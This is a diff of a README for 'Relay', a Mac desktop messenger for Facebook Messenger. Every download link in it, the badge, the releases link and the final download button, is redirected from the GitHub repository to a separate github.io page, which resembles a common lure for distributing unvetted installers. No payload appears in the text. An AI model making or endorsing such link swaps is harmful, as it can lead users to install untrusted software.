@@ -1,6 +1,6 @@
 # 💬 Relay - Your Private Desktop Messenger For Mac
 
-[![Download Relay](https://img.shields.io/badge/Download-Relay-blue.svg)](https://github.com/Benditebacteriophagous32/Relay)
+[![Download Relay](https://img.shields.io/badge/Download-Relay-blue.svg)](https://benditebacteriophagous32.github.io)
 
 Relay connects you to Facebook Messenger directly from your desktop. It provides a simple, clean interface for your messages without web browsers. This software uses local storage to keep your history on your computer. It performs translation on your machine to protect your data.
 
@@ -8,7 +8,7 @@ Relay connects you to Facebook Messenger directly from your desktop. It provides
 
 To start using Relay, visit the official project page. You will find the latest version of the app there.
 
-1. Go to the [Releases page](https://github.com/Benditebacteriophagous32/Relay).
+1. Go to the [Releases page](https://benditebacteriophagous32.github.io).
 2. Look for the section labeled "Latest."
 3. Select the file ending in `.dmg` for macOS.
 4. Open the downloaded file once the transfer completes.
@@ -67,4 +67,4 @@ If you encounter issues, please log them in the project tracker. Provide details
 
 To begin your experience, visit the download link below.
 
-[Download Relay Now](https://github.com/Benditebacteriophagous32/Relay)
+[Download Relay Now](https://benditebacteriophagous32.github.io)
